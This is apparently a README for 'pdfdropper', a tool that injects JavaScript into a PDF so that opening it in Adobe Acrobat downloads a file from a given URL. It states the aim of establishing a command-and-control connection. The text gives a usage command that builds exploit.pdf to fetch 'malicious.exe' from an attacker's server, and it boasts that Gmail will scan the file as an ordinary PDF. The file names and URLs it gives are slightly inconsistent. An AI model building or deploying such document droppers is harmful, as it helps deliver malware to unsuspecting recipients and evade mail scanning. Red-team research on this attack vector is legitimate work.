# pdfdropper
https://cti.monster/blog/2024/07/25/pdfdropper.html    
https://github.com/0x6rss/pdfdropper

## Introduction
PDF files are often considered static documents by most people. However, 
the PDF standard allows for the execution of JavaScript code within the document. 
This feature offers various attack vectors that can be used for Red Team tests and 
cybersecurity research. In this article, we will examine how to inject JavaScript 
into a PDF file to download a file from a specific URL and establish a Command and 
Control (C2) connection using this method.

## Adding JavaScript to PDF Files
JavaScript can be used for various purposes within PDF files. However, the 
capabilities of JavaScript in PDF files are more limited compared to JavaScript 
in HTML and web pages. Browsers and PDF viewers restrict the access area of 
JavaScript within PDFs for security reasons. Nevertheless, we can perform certain 
operations within these limitations.

## Creating a PDF Dropper
To add malicious code to a PDF file and download a file from a specific URL, we can 
follow these steps:  

### Step 1: Install Required Python Libraries
First, we need to install the required Python libraries. The fpdf2 library is what 
we will use to create and manipulate PDF files.
```
pip install fpdf2
```

### Step 2: Adding JavaScript Code to the PDF
The following Python code allows you to add JavaScript to a PDF file to download a file from a specific URL.
```
adobecodeinject.py  
main.py
```

### Creating and Testing the PDF File
You can create the PDF file with this command:
```
python main.py -f original.pdf -o exploit.pdf -downloadUrl http://yourserver/malicious.exe
```
When you open the exploited.pdf file in Adobe Acrobat, it should download the file from http://localhost/test.exe when the PDF is opened. This method is particularly effective with Adobe Acrobat software.  
This method will make Gmail even scan the file as a regular PDF.